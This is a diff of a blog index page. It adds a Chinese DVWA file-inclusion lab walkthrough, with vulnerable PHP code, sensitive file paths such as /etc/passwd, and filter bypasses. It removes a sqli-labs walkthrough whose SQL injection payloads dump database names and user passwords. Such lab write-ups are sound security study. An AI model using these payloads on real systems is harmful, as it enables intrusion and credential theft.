@@ -64,6 +64,114 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-DVWA—File Inclusion" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/02/28/DVWA%E2%80%94File%20Inclusion/" class="article-date">
+  <time datetime="2021-02-28T11:26:47.000Z" itemprop="datePublished">2021-02-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/02/28/DVWA%E2%80%94File%20Inclusion/">DVWA—File Inclusion</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>File Inclusion，译为文件包含（漏洞）。服务器开启allow_url_include选项时，就可以通过php的某些特性函数（<code>include()</code>，<code>require()</code>和<code>include_once()</code>，<code>require_once()</code>）利用url去动态包含文件。此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p>
+<ul>
+<li>文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞。</li>
+</ul>
+<p><strong>本地文件包含漏洞：</strong>通过浏览器包含web服务器上的文件，这种漏洞是因为服务器包含文件时没有进行严格的过滤，直接允许并执行用户在url输入的服务器包含文件。通俗的说就是被包含的文件在服务器本地。</p>
+<p><strong>远程文件包含漏洞：</strong>服务器开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。在远程服务器上预先设置好的webshell，然后攻击者利用该漏洞包含一个远程的文件。这种漏洞的出现是因为服务器对用户的输入没有进行检查，会导致不同程度的信息泄露。通俗的说就是被包含的文件不在目标服务器。</p>
+<ul>
+<li><p>常见的敏感信息路径</p>
+<p>利用本地文件包含漏洞可以获取系统（服务器）的本地文件的内容。<br><strong>Windows系统常见敏感文件如下：</strong></p>
+<p>c:\boot.ini                               系统版本信息<br>c:\xxx\php.ini                         PHP配置信息。<br>c:\xxx\my.ini                           MySQL配置信息。<br>c: \xxx\httpd.conf                  Apache配置信息。<br><strong>linux系统常见敏感文件如下：</strong></p>
+<p>/etc/passwd                                    Linux系统账号信息。<br>/etc/httpd/conf/httpd.conf          Apache配置信息。<br>/etc/my.conf                                  MySQL配置信息。<br>/usr/etc/php.ini                             PHP配置信息。</p>
+</li>
+<li><p>常见路径符号</p>
+<p>/                                 根目录<br>./                                当前目录<br>../                               返回到上一级目录<br>../../                            返回上两级目录<br>.\ 、..\和./、../          意义相同</p>
+</li>
+</ul>
+<h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到，服务器端对page参数没有做任何的过滤跟检查。</p>
+<ul>
+<li><strong>利用本地文件包含漏洞</strong></li>
+</ul>
+<p>我们先让参数page的值等于一个服务器本地不存在的文件![1](DVWA—File Inclusion/1.png)</p>
+<p>我们可以看到网站的根目录为<code>\DVWA-master\</code>，而<code>index.php</code>文件距根目录差两个文件夹，那么我们可以通过两个<code>../</code>回到根目录，然后去访问一些敏感文件：如PHP版本信息等。![2](DVWA—File Inclusion/2.png)</p>
+<ul>
+<li><strong>利用远程文件包含漏洞</strong></li>
+</ul>
+<p>因为我们搭的是靶场模拟服务器，那dvwa（81端口）靶场就相当于一个服务器，我们再在“远端服务器”127.0.0.1下上传文件1.txt内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">      phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后利用远程文件包含访问![3](DVWA—File Inclusion/3.png)</p>
+<h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到服务器过滤了<code>http://</code>, <code>https://</code>，<code>../</code>, <code>..\</code>，但是我们只要用双写就可以绕过了</p>
+<p>![4](DVWA—File Inclusion/4.png)</p>
+<p>![5](DVWA—File Inclusion/5.png)</p>
+<h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, $file ) &amp;&amp; $file != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>新函数：</p>
+<p><strong>fnmatch() 函数</strong></p>
+<p>功能：根据指定的模式来匹配文件名或字符串。</p>
+<p>语法：fnmatch(pattern,string,flags)</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">pattern</td>
+<td align="left">必需。规定要检索的模式。</td>
+</tr>
+<tr>
+<td align="left">string</td>
+<td align="left">必需。规定要检查的字符串或文件。</td>
+</tr>
+<tr>
+<td align="left">flags</td>
+<td align="left">可选。</td>
+</tr>
+</tbody></table>
+<p>我们可以看到服务器规定只能包含以file开头的文件，但是我们可以利用file协议绕过。</p>
+<p>file协议主要用于访问本地计算机中的文件，当我们用浏览器打开一个本地文件时利用的就是file协议![6](DVWA—File Inclusion/6.png)</p>
+<p>file协议的基本格式：file:///文件路径</p>
+<p>由于file协议规定只能由于访问本地文件，因此搭配文件上传漏洞效果极佳。![7](DVWA—File Inclusion/7.png)</p>
+<h1 id="Impossible："><a href="#Impossible：" class="headerlink" title="Impossible："></a>Impossible：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Impossible File Inclusion Source</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( $file != <span class="string">&quot;include.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; $file != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/28/DVWA%E2%80%94File%20Inclusion/" data-id="ckr0oba2f000ei8vu8bwy1nw9" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-DVWA—Command Injection" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/02/25/DVWA%E2%80%94Command%20Injection/" class="article-date">
@@ -1268,111 +1376,6 @@
 
 
   
-    <article id="post-lesson25-28a" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/02/04/lesson25-28a/" class="article-date">
-  <time datetime="2021-02-04T08:26:27.000Z" itemprop="datePublished">2021-02-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/02/04/lesson25-28a/">lesson25-28a</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="lesson25："><a href="#lesson25：" class="headerlink" title="lesson25："></a>lesson25：</h2><p>这一关它告诉我们and和or都被过滤了。</p>
-<p>一般，绕开过滤的方法有以下几种：</p>
-<p>（1）大小写变形 Or,OR,oR </p>
-<p>（2）编码，hex，urlencode </p>
-<p>（3）添加注释/<em>or</em>/ </p>
-<p>（4）利用符号 and=&amp;&amp;，or=||</p>
-<p>（5）构造字符串——oorr，anandd</p>
-<p>我们查看源码：</p>
-<p><img src="/lesson25/1.png" alt="1"></p>
-<p>这里的or和and采用了i正则匹配，大小写都无法绕过。</p>
-<p>{               <strong>拓展一下PHP正则表达式的模式修饰符</strong></p>
-<ul>
-<li>i</li>
-</ul>
-<p>​       如果设定此修正符，模式中的字符将同时匹配大小写字母。</p>
-<ul>
-<li><p>m<br>当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。</p>
-</li>
-<li><p>s<br>如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。</p>
-</li>
-<li><p>x<br>如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。</p>
-</li>
-</ul>
-<p>}</p>
-<p><strong>那么这关我们就以双写绕过的方式为例。</strong></p>
-<p>查看源码：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">&#x27;$id&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">&quot;;</span></span><br></pre></td></tr></table></figure>
-
-<p>从中得知这关为单引号类型注入。</p>
-<p>当输入?id=1时，页面有回显。那么我们可以采用union联合注入。</p>
-<h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库:"></a>爆库:</h3><p>输入：?id=0’  union select 1,2,database()–+</p>
-<p>得，<img src="/lesson25/2.png" alt="2"></p>
-<h3 id="爆表："><a href="#爆表：" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=0’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where </p>
-<p>table_schema=’security’–+</p>
-<p>得，<img src="/lesson25/3.png" alt="3"></p>
-<p>注：information中也含有or，因此也需要做绕过处理。</p>
-<h3 id="爆列："><a href="#爆列：" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=0’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where </p>
-<p>table_schema=’security’–+</p>
-<p>得，<img src="/lesson25/4.png" alt="4"></p>
-<h3 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=0’ union select 1,2,group_concat(username,0x3a,passwoorrd) from users–+</p>
-<p>得，<img src="/lesson25/5.png" alt="5"></p>
-<p>注：password中也含有or，因此也需要做绕过处理。</p>
-<h2 id="lesson25a"><a href="#lesson25a" class="headerlink" title="lesson25a:"></a>lesson25a:</h2><p>和lesson25没什么区别，注意注入类型就好了。</p>
-<h2 id="lesson26："><a href="#lesson26：" class="headerlink" title="lesson26："></a>lesson26：</h2><p>查看源码：<img src="/lesson25/6.png" alt="6"></p>
-<p>我们可以看到它就过滤了一堆字符。此时，我们可以采用<strong>URL编码</strong>绕过这些过滤：</p>
-<p>+       URL 中+号表示空格                 %2B<br>空格  URL中的空格可以用+号或者编码      %20<br>/        分隔目录和子目录                   %2F<br>?        分隔实际的URL和参数               %3F<br>%       指定特殊字符                     %25<br>#       表示书签                         %23<br>&amp;       URL 中指定的参数间的分隔符         %26<br>=        URL 中指定参数的值                %3D</p>
-<p>我不知道为什么空格我一直找不到绕开的方法，上面的几种都不行，好像是apache的问题，要我们用linux系统才能绕过。既然这样我们只能避免输入空格了，使用报错注入——</p>
-<h3 id="爆库："><a href="#爆库：" class="headerlink" title="爆库："></a>爆库：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,database()),1)||’1’=’1</p>
-<p>得，<img src="/lesson25/7.png" alt="7"></p>
-<h3 id="爆表：-1"><a href="#爆表：-1" class="headerlink" title="爆表："></a>爆表：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p>
-<p>得，<img src="/lesson25/8.png" alt="8"></p>
-<h3 id="爆列：-1"><a href="#爆列：-1" class="headerlink" title="爆列："></a>爆列：</h3><p>输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’anandd(table_schema=’security’)))),1)||’1’=’1</p>
-<p>得，<img src="/lesson25/9.png" alt="9"></p>
-<h3 id="爆值：-1"><a href="#爆值：-1" class="headerlink" title="爆值："></a>爆值：</h3><p>输入：?id=1’||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||’1’=’1</p>
-<p>得，<img src="/lesson25/10.png" alt="10"></p>
-<p>这里有一个问题，limit因为过滤因素用不了，很难受，而且报错长度又有限，那么这时我们可以通过控制id的值来一个个查询，例如输入：?id=1’ || updatexml(1, concat(0x7e, (select (group_concat(  concat_ws(0x7e,username,passwoorrd)  )) from (security.users)  where(id=5))) ,1)  || ‘1’=’1</p>
-<h2 id="lesson26a："><a href="#lesson26a：" class="headerlink" title="lesson26a："></a>lesson26a：</h2><p>当我们输入导致sql语法错误的时候，不会回显，那么我们就无法使用报错注入了。</p>
-<h2 id="lesson27："><a href="#lesson27：" class="headerlink" title="lesson27："></a>lesson27：</h2><p>同lesson26，报错注入。</p>
-<p>源码：</p>
-<p><img src="/lesson25/11.png" alt="11"></p>
-<ul>
-<li><p>若想使用union联合注入，只需要将 union 和 select 改为大小写混合就可以了。</p>
-</li>
-<li><p>这关取消了对and和or的过滤。</p>
-</li>
-</ul>
-<h2 id="lesson27a："><a href="#lesson27a：" class="headerlink" title="lesson27a："></a>lesson27a：</h2><p>不能使用报错注入。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/04/lesson25-28a/" data-id="ckr0oba3c002si8vu5ijj996e" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -1423,6 +1426,10 @@
       <ul>
         
           <li>
+            <a href="/2021/07/17/buuctf8/">buuctf8</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/15/buuctf7/">buuctf7</a>
           </li>
         
@@ -1436,10 +1443,6 @@
         
           <li>
             <a href="/2021/07/12/bugku3/">bugku3</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/11/buuctf5/">buuctf5</a>
           </li>
         
       </ul>
